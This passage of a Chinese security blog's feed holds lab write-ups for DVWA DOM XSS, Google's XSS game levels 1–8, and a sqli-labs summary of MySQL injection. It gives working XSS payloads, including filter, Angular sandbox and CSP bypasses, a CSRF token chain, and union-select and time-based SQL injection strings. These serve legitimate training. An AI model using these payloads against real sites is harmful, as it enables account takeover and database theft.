value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; 分析在script脚本里，通过document操作后将default后面的参数值直接赋值给了lang，经过url解码后将其值赋给option标签的value属性节点和文本节点直接显示出来， 直接将default后面的参数值改为test后可以看到显示了test Payload&lt;script&gt;alert(/xss-dom/)&lt;/script&gt; Medium&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）,这里过滤了&lt;script标签且大小形式了过滤了 Payload方式1url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤 ?#default=&lt;script&gt;alert(/dom-xss-test-medium/)&lt;/script&gt; 方法2或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造链接，要注意闭合 img标签onerror事件加载 document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;img src=# onerror=&quot;alert(&quot;xss&quot;)&quot;&gt; 同样的标签还有svg，svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果 &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;svg onload=&quot;alert(&quot;xss&quot;)&quot;&gt; HighVulnerability Source&lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # White list the allowable languages switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 分析服务端使用了case语句进行判断，不能再通过其他JavaScript事件来绕过了这里我们使用 # 来跳过服务端检查 Payload#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 验证成功 ImpossibleVulnerability Source&lt;?php # Don&apos;t need to do anything, protction handled on the client side ?&gt; 参考通过DVWA学习XSS 绕过DVWA所有安全级别的XSS Payload]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F07%2F04%2FWargame-XSS-game%2F</url>
    <content type="text"><![CDATA[Wargame-XSS-gamehttp://www.xssgame.com/ Level 1:Hello,world of XSS提示部分任务描述 此级别演示了跨站点脚本的常见原因，其中用户输入直接包含在页面中而没有正确转义。 与下面的易受攻击的应用程序窗口交互，找到一种方法使其执行您选择的JavaScript。您可以在易受攻击的窗口内执行操作或直接编辑其URL栏。 使命目标 注入脚本以alert()在下面的框架中弹出JavaScript 。 一旦显示警报，您就可以进入下一级别。你的目标 测试在输入框中随便输入 test 后得到 https://xss-game.appspot.com/level1/frame?query=test URL变化 页面重新加载 测试的字符内容被一起加载到页面中 其中URL结尾的?query= 后面的内容与我们输入的是一致的（输入输出相同） payload&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; 执行成功 https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; Level 2:Persistence is key(持久性是关键)时间到了！用户提供的每一项数据都必须正确转义，以显示它所在页面的上下文。这个级别说明了原因。 输入一个输入，使应用程序在JavaScript中执行alert（）函数。 分析关键部分代码&lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(&quot;Time is up!&quot;); window.loading.style.display = &apos;none&apos;; window.message.innerHTML = &apos;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&apos;; }, seconds * 1000); } &lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;h1 style=&quot;font-family: serif&quot;&gt; webtim&lt;span style=&quot;color: teal&quot;&gt;r&lt;/span&gt; &lt;span style=&quot;color: green&quot;&gt;pro&lt;/span&gt; &lt;/h1&gt; &lt;!-- Source: https://commons.wikimedia.org/wiki/File:Loading_icon.gif --&gt; &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; &lt;br&gt; &lt;div id=&quot;message&quot;&gt;Your timer will execute in 3 seconds.&lt;/div&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 关键部分是函数StartTimer() 和 &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; 知识点&lt;script&gt; var a = &apos;a&apos; + alert(); // 或者 &apos;-&apos; 也可以，重点在于让 alert() 参与运算 // 当 alert() 参与运算的时候 // js 会尝试让 alert() 先执行 // 然后取其执行后的返回值再参与前面的运算 &lt;/script&gt; 再结合 img 标签的 onload 事件：onload = &quot;startTime(&apos;?&apos;)&quot;; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的位置插入 // 先尝试直接插入alert() onload = &quot;startTimer(&apos;alert()&apos;)&quot;; // startTimer(&apos;alert()&apos;); …… 这不直接当字符串传过去了吗…… 不行 // 看看上面的知识点…… // 插入 a&apos;+alert()+&apos;a onload = &quot;startTimer(&apos;a&apos;+alert()+&apos;a&apos;)&quot;; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串 // 插入 &apos;+alert()+&apos; onload = &quot;startTimer(&apos;&apos;+alert()+&apos;&apos;)&quot;; payload：&apos;+alert(&quot;xss&quot;)+&apos; http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert(&quot;xss&quot;)+&apos; Level 3 画廊复杂的Web应用程序通常会在JavaScript中生成部分UI。一些常见的JS函数是执行接收器，这意味着它们将导致浏览器执行其输入中出现的任何脚本。 这个级别的应用程序正在使用一个这样的接收器。 由于您无法在应用程序的任何位置输入有效负载，因此您必须在提供的URL栏中手动编辑地址。目标是利用应用程序中的漏洞使其执行JavaScript alert（）函数。 测试随手输入参数非法的参数-1，可以看到页面回显了 -1 源码&lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/jquery2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; window.onvalidationready = null; function validate() { $.post(location.pathname, {&apos;h&apos;: location.hash}, function(data, status) { $(&apos;#result&apos;).html(data); if (window.onvalidationready) { window.onvalidationready(); window.onvalidationready = null; } }); } function chooseTab(name) { var html = &quot;Cat &quot; + parseInt(name) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&apos;/static/img/cat&quot; + name + &quot;.jpg&apos; /&gt;&quot;; document.getElementById(&apos;tabContent&apos;).innerHTML = html; // Select the current tab var tabs = document.querySelectorAll(&apos;.tab&apos;); for (var i = 0; i &lt; tabs.length; i++) { if (tabs[i].id == &quot;tab&quot; + parseInt(name)) { tabs[i].className = &quot;tab active&quot;; } else { tabs[i].className = &quot;tab&quot;; } } window.location.hash = name; // Tell parent we&apos;ve changed the tab top.postMessage({&apos;url&apos;: self.location.toString()}, &quot;*&quot;); } function hashchange() { if (self.location.hash) { chooseTab(self.location.hash.substr(1)); validate(); } else { chooseTab(1); } } window.onload = hashchange; window.onhashchange = hashchange; &lt;/script&gt; &lt;/head&gt; &lt;body id=&quot;dom-demo&quot;&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;div id=&quot;header&quot;&gt; &lt;span&gt;Cat Image&lt;/span&gt; &lt;span&gt;X&lt;/span&gt;&lt;span&gt;S&lt;/span&gt;&lt;span&gt;S&lt;/span&gt; Library &lt;/div&gt; &lt;!-- Source: https://www.flickr.com/photos/eraphernalia_vintage/2988746750 CC BY-SA 2.0 https://creativecommons.org/licenses/by-sa/2.0/ Created by Cheryl, published here without modifications --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab1&quot; onclick=&quot;chooseTab(&apos;1&apos;)&quot;&gt;Cat 1&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab2&quot; onclick=&quot;chooseTab(&apos;2&apos;)&quot;&gt;Cat 2&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab3&quot; onclick=&quot;chooseTab(&apos;3&apos;)&quot;&gt;Cat 3&lt;/div&gt; &lt;div id=&quot;tabContent&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 关键部分这里进行了文件名的拼接 需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 … 并不会被执行。 img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt; &lt;!-- 当图片加载错误的时候，就会执行 onerror 中的 alert() 方法 对于本关 我们只需要让他访问一个不存在的图片并让其执行 onerror=&apos;alert()&apos; 就OK了 --&gt; payload8&apos;onerror=&apos;alert(/xss/)&apos; http://www.xssgame.com/f/u0hrDTsXmyVJ/#8&apos;onerror=&apos;alert(/xss/)&apos; 用单引号截断1,使其 scr 指向’1’这个文件，并加入 onerror 事件，而因为’1’这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。 Level 4 谷歌读者跨站点脚本不仅仅是正确转义数据。有时，即使没有将新元素注入DOM，攻击者也可以做坏事。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。重要的是解决方案不应该要求用户交互 - 打开URL应该足以触发警报。另请注意，alert（）应弹出挑战域 - 重定向到您自己的网页，并提醒那里不会被视为有效的解决方案。 测试Sign up &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;!-- We&apos;re ignoring the email, but the poor user will never know! --&gt; Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;a href=&quot;confirm?next=welcome&quot;&gt;Next &gt;&gt;&lt;/a&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt; &lt;img src=&quot;/static/img/googlereader.png&quot; /&gt;&lt;br&gt; &lt;a href=&quot;signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta. &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; Thanks for signing up, you will be redirected soon... &lt;script&gt; setTimeout(function() { window.location = &apos;welcome&apos;; }, 1000); &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 其中的’Welcome’像是我们 URL 中传入的参数。经传入其他参数测试，发现 window.location = 我们传入的参数。 知识点window.location = &apos;welcome&apos;; /* 这是一个页面重定向的操作 window.location 等同于 window.location.href 而 DOM 的 href 属性呢，支持这样写： &lt;a href=&apos;javascript:alert()&apos; &gt; &lt;/a&gt; */ payload:confirm?next=javascript:alert() http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert() Level 5 角Angular是一个非常流行的框架，在安全地开发应用程序时有一套自己的规则。其中之一是在Angular的模板系统运行之前修改DOM时应该小心。 这一挑战说明了为什么这很重要。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 代码分析&lt;script&gt; angular.module(&apos;myApp&apos;, []) .controller(&apos;myController&apos;, [&apos;$scope&apos;, function ($scope) { $scope.query = &quot;&quot;; $scope.alert = window.alert; }]); var UTM_PARAMS = [&quot;utm_content&quot;, &quot;utm_medium&quot;, &quot;utm_source&quot;, &quot;utm_campaign&quot;, &quot;utm_term&quot;] if (location.search) { var params = location.search.substring(1).split(&apos;&amp;&apos;); for (var p in params) { var r = params[p].split(&apos;=&apos;); if (r.length == 2 &amp;&amp; UTM_PARAMS.indexOf(r[0]) != -1) { var el = document.getElementsByName(r[0]); if (el.length) el[0].value = decodeURIComponent(r[1]); } } } &lt;/script&gt; 先定义了一个数组，用来过滤 URL 中的参数。过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个： &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input name=&quot;utm_term&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;utm_campaign&quot; type=&quot;hidden&quot; value=&quot;cpc&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; 可以看到utm_term 输入框属性是hidden 知识点什么是 Angular一款非常优秀的前端高级 JS 框架 其核心就是通过指令扩展了 HTML，通过表达式绑定数据到 HTML。 Angular不推崇DOM操作，也就是说在NG中几乎找不到任何的DOM操作 在Angular中怎么使用alert() Angular 表达式{{}}表示一个表达式，像模板引擎 hello:{{user.name}} {{“hello:”+user.name}} {{1+1}} {{[1,2,3,4]}} payload选择一个节点进行赋值 ?utm_term={{alert()}} http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}} Less 6 角2经常导致Angular表达式注入的编程模式是使用服务器端模板系统来生成Angular用作其自己的模板的HTML。即使服务器端模板保证输出中没有“普通”XSS，也是如此。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 测试输入test,会发现输入的内容与输出的一致，尝试构造alert()进行测试，但是显示失败，这是因为 ng-non-bindable指令会告诉AngularJS当前的HTML元素或其子元素不需要编译 这里版本是1.2.0，是一个很早的版本&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt; 直接在网上搜索 Angular1.2.0 xss可得在文末我们找到了当前版本对应 Angular 1.2.0-1.2.1 的 Sandbox bypasses {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} 直接输入以上payload得到 &lt;form action=&quot;/f/rWKWwJGnAeyi/?query=a=&apos;constructor&apos;;b=};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()}}&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; 可以看到是进行了过滤 左花括号被过滤了 { ｛ &amp;#123; --- 大括号左边部分Left curly brace &amp;lcub; ｝ &amp;#125; --- 大括号右边部分Right curly brace &amp;rcub; &amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()&amp;rcub;&amp;rcub; 这里构造简单的也可以，不用拼接&amp;lcub;&amp;lcub;alert()}} Leval 7 CSP内容安全策略是防止注入成为可利用的XSS的重要工具。但这不是一个灵丹妙药 - 很多时候CSP政策都是可以绕过的。 这一挑战展示了一种常见的CSP旁路技术。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。 &lt;a href=&quot;?menu=YWJvdXQ=&quot;&gt;About Me&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/construction-safety-site-banner-1174806/ License: Public Domain --&gt; &lt;a href=&quot;?menu=Y2F0cw==&quot;&gt;Cats&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ License: Public Domain --&gt; &lt;a href=&quot;?menu=ZG9ncw==&quot;&gt;Dogs&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/goggles-dog-canine-pet-vacation-1472479/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/dog-sidecar-sunglasses-funny-171773/ License: Public Domain --&gt; &lt;script src=&quot;/static/js/level7.js&quot;&gt;&lt;/script&gt; 代码分析?menu=ZG9ncw== menu后面的参数会进行改变可以看到加载了/static/js/level7.js /static/js/level7.js代码/** * Ask server side what to display. */ function main() { var m = location.search.match(&apos;menu=(.*)&apos;); var menu = m ? atob(m[1]) : &apos;about&apos;; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); } /** * Display stuff returned from server side. * @param {string} data - JSON data from server side */ function callback(data) { if (data.title) document.write(&apos;&lt;h1&gt;&apos; + data.title + &apos;&lt;/h1&gt;&apos;); if (data.pictures) data.pictures.forEach(function(url) { document.write(&apos;&lt;img src=&quot;/static/img/&apos; + url + &apos;&quot;&gt;&lt;br&gt;&lt;br&gt;&apos;); }); } main(); 解释如下function main(){ //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。 //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码 } function callback(data){ // 通过代码判断，data 应该是 json 格式。 // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源 } main(); //执行 main 方法 我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 ‘jsonp’： JSONP：JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 元素标签，远程调用 JSON 文件来实现数据传递。 搜索发现其中callback可定义导致一些安全问题 我们用 callback 这个参数去我们的 Level 7 中测试一下?callback=3 callback执行成功，说明存在问题Level7.js中 function main() { var m = location.search.match(&apos;menu=(.*)&apos;);// 查找了一下当前 URL 中 &apos;menu=&apos; 后面的参数 var menu = m ? atob(m[1]) : &apos;about&apos;; // 如果没有获取到参数，则赋值为 &apos;about&apos; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); // 在页面中写入 &lt;script&gt; 标签 ，通过 src 请求资源 } 因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。 正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：’about’、’cats’、’dogs’。相应的会有三种 callback 的 JSON 对象。如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，’atob’ 函数是解码，编码函数猜也猜到应该是 ‘btoa’ 了~ 验证一下果然如此 而且我们发现报错后直接输的值为我们输入的值转码后的值 我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下： 执行失败，红色的报错部分显示由于CSP的原因，执行失败 PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= 现在我们可以利用的两个点是1、callback可以使用、2、menu传递错误的参数可以显示、 给 menu 传入经过 base64 编码后的： &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // 转义前为：&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; 会把 &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; 显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为： alert();//({…})alert(); 后面被注释掉，执行 alert(); PayloadPHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ 执行成功 Level 8 CSRF此挑战演示了许多Web安全性概念，例如CSP，跨站点请求伪造令牌和Self-XSS。 目标是再次利用应用程序中的漏洞使其执行JavaScript alert（）函数。在这种情况下，重要的是，解决方案URL也应该在其他浏览器中触发相同的结果 - 仅使用这些特定的cookie显示在此计算机上工作的URL是不够的。 关键代码分析/** * Read cookie. * @param {string} name - Name of the cookie * @returns {string} Cookie value */ function readCookie(name) { var match = RegExp(&apos;(?:^|;)\\s*&apos; + name + &apos;=([^;]*)&apos;).exec(document.cookie); return match &amp;&amp; match[1]; } var username = readCookie(&apos;name&apos;); if (username) { document.write(&apos;&lt;h1&gt;Welcome &apos; + username + &apos;!&lt;/h1&gt;&apos;); } document.addEventListener(&quot;DOMContentLoaded&quot;, function(event) { csrf_token.value = readCookie(&apos;csrf_token&apos;); }); 这个文件负责读取 cookie 的信息，如果读取到了 ‘name’ 的内容，就 document.write 到页面上。 测试一下 set尤其是这个url很奇怪value的值为输入的名字后面重定向到了index http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=testhahha&amp;redirect=index 输入一个非整数 可以看到页面显示了我们输入的小数、 http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=hello&amp;amount=0.22&amp;csrf_token=EVPQBFQCH2 url中的csrf_token作为参数传递给后台 得到的信息1、输入的不合法参数金额 account的值会显示出来 2、此页面没有CSP的标识 3、csrf_token 作为参数传递给后台。 在account处构造能够弹窗的代码 &lt;script&gt;alert()&lt;/script&gt; 失败 警告显示您执行了警报，但解决方案的服务器端验证失败。这可能意味着您的解决方案需要用户交互，或者不够通用，无法为不同的用户工作。请尝试使其无需用户交互，并且足够通用，以便适用于任何用户。它也可能是由使用绝对URL引用引起的 - 请避免使用它们 这里的意思由于不同的用户的原因，因为 csrf_token 每个人的都不同 token 很可能可以被 set，如果可行，那就通…… 你懂得。我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。OK，我们来构建URL： http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass 这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 &amp; 符会被截断。所以我们这里 把这个 ‘redirect=’ 后面的内容处理一下，chrome 控制台： encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;) 得到返回值： transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass 好我们替换一下 URL： http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass 参照http://or7.me/2017/08/03/Google_xssgame/http://www.freebuf.com/articles/web/133384.html]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Summarize-Less-1-22_Basic-Injections]]></title>
    <url>%2F2018%2F07%2F04%2Fsqli-labs-Summarize-Less-1-22-Basic-Injections%2F</url>
    <content type="text"><![CDATA[sqli-labs-Summarize-Less-1-22(Basic-Injections)重要的系统数据库mysql.user 存储MySQL数据库的用户及用户权限信息 and (select count(*) from mysql.user)&gt; 判断是否具有读写权限 information_schema.user_privileges存储mysql中所有数据库的权限信息 information_schema.schemate 存储mysql中所有的数据库 遍历查询系统中所有数据库名 select schema_name from information_schema.schemata limit 0,1 information_schema.tables 存储mysql中所有数据库的表 遍历查询数据库中所有的表名 select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 information_schema.columns存储mysql中所有数据库的列 遍历查询表中所有的列名 select column_name form information_schema.columns where table_name=&apos;users&apos; limit 0,1 遍历查询表中的数据 select password from security.users limit 0,1 常用操作常用语句select 用于输出信息 select 列名|（数字|字符串|函数）as 别名（as可以省略）[from ...] union 联合操作符，要求前后列数相同，数据类型相差不大 group by 分组 order by 排序，常用于猜解字段数 order by 列名|序列号 sql的switch语句 case expr when a then a** when b then b* else c* end if 函数，当expr1为真返回expr2否则返回expr3 if(expr1,expr2,expr3) 常用函数（获取系统信息）system_user() /*系统用户名 user() /*用户名 current_user() /*当前用户名 session_user() /*连接数据库的用户名 database() /*数据库名 version() /*MYSQL数据库版本 load_file() /*MYSQL读取本地文件的函数 @@datadir /*读取数据库路径 @@basedir MYSQL /*安装路径 @@version_compile_os /*操作系统 常用字符串函数concat() /*连接字符串 group_concat() concat_ws() /*连接字符串，第一个参数为分隔符 char() /*获得字符串 left(str, len) /*截取str左边len位 right(str, len) /*截取str右边len位 substring(str, pos, len) /*截取字符串 rand() /*生成0至1的随机数 floor(n) /*向下取整 name_conset(column_name, value) /*用来产生一个结果集合 sleep(seconds) 停止seconds秒，用于time-based盲注 benchmark(times, function) 将function执行times次，该函数可用于time-based盲注，例如（benchmark(500000, encode(‘a’,’b&apos;))） encode(str, passwd_str) 使用passwd_str加密str函数 判断是否可以注入使用标点符号(单引号，双引号，括号)判断注入，例如：http://aaa.com/s.php?id=1&apos; 如果返回页面提示syntax error，则说明有漏洞 通过附加逻辑运算判断注入，例如：http://aaa.com/s.php?id=1 and 1=1/and 1=2 and 1=1有返回，and 1=2无返回 通过算数运算判断注入点，例如：http://aaa.com/s.php?id=11-1 通过select语句判断注入点，例如：http://aaa.com/s.php?id=(select 10) 通过时间函数判断注入点，例如：http://aaa.com/s.php?id=2 and sleep(10) 或者http://aaa.com/s.php?id=2 and benchmark(500000, encode(&apos;msg&apos;,&apos;bbb&apos;)) 常规注入流程猜解列数order by n /*（注释符 /* # --） 查询mysql基本信息(假设数据库表有7列)and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/* 例如：select * from sedb.site_tb where 1=2 union select 1,2,concat_ws(char(32,58,32),0x7c,user(),database(),version()); 查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)and 1=2 union select 1,schema_name,3,4 from information_schema.schemata/* and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/* 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(schema_name) from information_schema.schemata; 查询某个数据库中有哪些表（数据库名可能需要16进制）and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名 and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库名 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&apos;sedb&apos;; 查询某个表中有哪些字段（表名、数据库名可能需要16进制）and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名 limit 1,1/* and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from 